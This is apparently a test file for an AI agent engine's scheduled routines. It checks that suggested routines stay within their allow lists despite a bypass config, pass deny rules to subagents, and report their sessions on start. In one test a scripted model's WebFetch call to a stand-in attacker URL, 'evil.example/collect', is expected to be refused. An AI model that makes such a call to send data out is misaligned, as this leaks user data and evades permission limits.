/**
 * QA round for routines made from suggestions, on a real engine with a
 * scripted model: they run on their allow list alone even when the config
 * says bypass, fetch only from the domains they list, pass their rules to
 * subagents, and a run reports its session as soon as it has one.
 */
import { afterEach, describe, expect, test } from 'bun:test';
import { existsSync } from 'node:fs';
import { join } from 'node:path';
import { PermissionRulesFor } from '../../src/engine/permissions-view';
import type { RoutineRun } from '../../src/types';
import { startTestEngine, type TestEngine } from './harness';

describe('routines made from a suggestion', () => {
  let t: TestEngine | undefined;
  afterEach(async () => {
    await t?.close();
    t = undefined;
  });

  test('bypass in the config does not widen the allow list, and WebFetch needs a listed domain', async () => {
    t = await startTestEngine({
      script: [
        [{ tool: 'Bash', input: { command: 'touch outside-the-list' } }],
        [{ tool: 'WebFetch', input: { url: 'https://evil.example/collect?k=1' } }],
        [{ text: 'STATUS: attention\nTwo calls were refused.' }],
      ],
      approve: 'allow',
      overrides: { permissions: { mode: 'bypass', allow: [], deny: [], ask: [], additionalDirectories: [] } } as never,
    });
    const { engine, cwd } = t;
    const r = engine.routines.create({ name: 'CVE watch', schedule: '20 8 * * *', prompt: 'Check', cwd, allow: ['WebFetch(domain:cisa.gov)'], suggestion: 'cve-watch', notify: 'never' });
    const run = await engine.routines.runNow(r.id, 'schedule');
    expect(run.status).toBe('ok');
    expect(engine.requireSession(run.sessionId!).permissionMode).toBe('default');
    expect(existsSync(join(cwd, 'outside-the-list'))).toBe(false);
    expect(run.denied?.map((d) => d.tool)).toEqual(['Bash', 'WebFetch']);
    expect(t.approvals).toEqual([]);
  });

  test('a routine the owner wrote by hand keeps the configured mode', async () => {
    t = await startTestEngine({
      script: [[{ tool: 'Bash', input: { command: 'touch by-hand' } }], [{ text: 'STATUS: ok' }]],
      overrides: { permissions: { mode: 'bypass', allow: [], deny: [], ask: [], additionalDirectories: [] } } as never,
    });
    const { engine, cwd } = t;
    const r = engine.routines.create({ name: 'Mine', schedule: '20 8 * * *', prompt: 'Touch', cwd, notify: 'never' });
    const run = await engine.routines.runNow(r.id, 'schedule');
    expect(engine.requireSession(run.sessionId!).permissionMode).toBe('bypass');
    expect(existsSync(join(cwd, 'by-hand'))).toBe(true);
  });

  test('a subagent of a routine session gets the routine rules', async () => {
    t = await startTestEngine({ script: [[{ text: 'ok' }]] });
    const { engine } = t;
    const r = engine.routines.create({ name: 'Inbox', schedule: '40 8 * * 1-5', prompt: 'x', allow: ['Bash(gh run list:*)'], deny: ['Bash(gh api ** -X**)'], suggestion: 'github-inbox' });
    const parent = await engine.createSession({ agent: 'assistant', cwd: t.cwd });
    engine.repos.sessions.update({ ...engine.requireSession(parent.id), routineId: r.id });
    const child = await engine.createSession({ agent: 'coder', cwd: t.cwd });
    engine.repos.sessions.update({ ...engine.requireSession(child.id), parentId: parent.id });
    const rules = PermissionRulesFor(engine, engine.requireSession(child.id));
    expect(rules.deny).toContain('Bash(gh api ** -X**)');
    expect(rules.allow).toContain('Bash(gh run list:*)');
    expect(rules.webFetchNeedsRule).toBe(true);
    // a session outside any routine stays as it was
    const other = await engine.createSession({ agent: 'assistant', cwd: t.cwd });
    expect(PermissionRulesFor(engine, engine.requireSession(other.id)).webFetchNeedsRule).toBeUndefined();
  });

  test('a run reports its session as soon as it starts, before it ends', async () => {
    t = await startTestEngine({ script: [[{ text: 'STATUS: ok' }]] });
    const { engine } = t;
    const r = engine.routines.create({ name: 'Quick', schedule: '20 8 * * *', prompt: 'Say ok', notify: 'never' });
    const seen: string[] = [];
    let started: RoutineRun | undefined;
    const run = await engine.routines.runNow(r.id, 'manual', undefined, {
      onStart: (x) => {
        started = x;
        seen.push(`start ${x.status}`);
      },
    });
    seen.push(`end ${run.status}`);
    expect(seen).toEqual(['start running', 'end ok']);
    expect(started?.sessionId).toBe(run.sessionId);
    expect(started?.id).toBe(run.id);
  });

  test('a skipped run still answers the caller', async () => {
    t = await startTestEngine({ script: [[{ text: 'STATUS: ok' }]] });
    const { engine } = t;
    const r = engine.routines.create({ name: 'Gated', schedule: '20 8 * * *', prompt: 'x', precheck: 'true', notify: 'never' });
    let started: RoutineRun | undefined;
    const run = await engine.routines.runNow(r.id, 'schedule', undefined, { onStart: (x) => (started = x) });
    expect(run.status).toBe('skipped');
    expect(started?.id).toBe(run.id);
  });
});
